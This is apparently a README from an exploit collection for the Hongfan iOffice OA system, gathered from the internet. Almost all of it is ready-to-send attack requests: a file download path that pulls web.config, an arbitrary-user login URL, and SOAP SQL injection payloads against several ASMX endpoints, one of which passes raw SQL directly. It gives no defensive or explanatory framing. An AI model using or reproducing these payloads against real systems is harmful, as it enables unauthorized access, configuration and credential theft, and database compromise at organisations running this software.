# ioffice_exp 从互联网收集的红帆oa漏洞
## ioFileDown.aspx任意文件下载
/ioffice/prg/interface/ioFileDown.aspx?sFilePath=/ioffice/web.config
## udfGetDocStep.asmx sql注入
```http
POST /ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetDocStep"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
    <GetDocStep xmlns="http://tempuri.org/">
        <docid>1'</docid>
    </GetDocStep>
    </soap:Body>
</soap:Envelope>  
```
## ioDesktopData.asmx sql注入
```http
POST /iOffice/prg/set/wss/ioDesktopData.asmx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
SOAPAction: http://tempuri.org/GetDepSchedule
Content-Type: text/xml;charset=UTF-8
Content-Length: 282

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
<soap:Header/>
<soap:Body>
<tem:GetDepSchedule>
<!--type: string-->
<tem:EmpLoginID>111*</tem:EmpLoginID>
</tem:GetDepSchedule>
</soap:Body>
</soap:Envelope>
```
## 任意用户登录
/iOffice/prg/interface/iologin215host.aspx
## wssRtSyn.asmx sql注入
/iOffice/prg/set/wss/wssRtSyn.asmx?op=SubmitShowMsg
```http
POST http://xxxxxx/iOffice/prg/set/wss/wssRtSyn.asmx HTTP/1.1
Host: xxxxxx
SOAPAction: http://iOffice.net/iOffice/ioRtSyn/SubmitLogInfo
Content-Type: text/xml
Cookie: ASP.NET_SessionId=s5zjcxf0isg4r045ujqnyur3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 457
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://iOffice.net/iOffice/ioRtSyn">
<soap:Header />
<soap:Body>
<tns: GetRootBranchName>
<tns:ServerHost>111‘</tns:ServerHost>
</tns: GetRootBranchName>
</soap:Body>
</soap:Envelope>
```
```
POST http://xxxxx/iOffice/prg/set/wss/wssRtSyn.asmx HTTP/1.1
Host: xxxxxx
SOAPAction: http://iOffice.net/iOffice/ioRtSyn/SubmitLogInfo
Content-Type: text/xml
Cookie: ASP.NET_SessionId=s5zjcxf0isg4r045ujqnyur3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Content-Length: 457
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://iOffice.net/iOffice/ioRtSyn">
<soap:Header />
<soap:Body>
<tns:SubmitLogInfo>
<tns:data>TzwSVsOw</tns:data>
<tns:ServerHost>222‘</tns:ServerHost>
</tns:SubmitLogInfo>
</soap:Body>
</soap:Envelope>
```
## UserForm.asmx sql注入
```http
POST http://xxxxx/ioffice/prg/set/wss/UserForm.asmx HTTP/1.1
Host: xxxxxx
Content-Type: text/xml; charset=utf-8
Content-Length: 386
SOAPAction: "http://tempuri.org/GetBase"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
 <soap:Body>
   <GetBase xmlns="http://tempuri.org/">
     <modCode>string'</modCode>
     <BaseName>string</BaseName>
   </GetBase>
 </soap:Body>
</soap:Envelope>
```
## ioAssistance2.asmx sql注入
```http
POST http://xxxxx/ioffice/prg/set/wss/ioAssistance2.asmx HTTP/1.1
Host: xxxxxx
Content-Type: text/xml; charset=utf-8
Content-Length: 347
SOAPAction: "http://tempuri.org/GetEmpInf"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
 <soap:Body>
   <GetEmpInf xmlns="http://tempuri.org/">
     <sql>select (@@version) </sql>
   </GetEmpInf>
 </soap:Body>
</soap:Envelope>
```
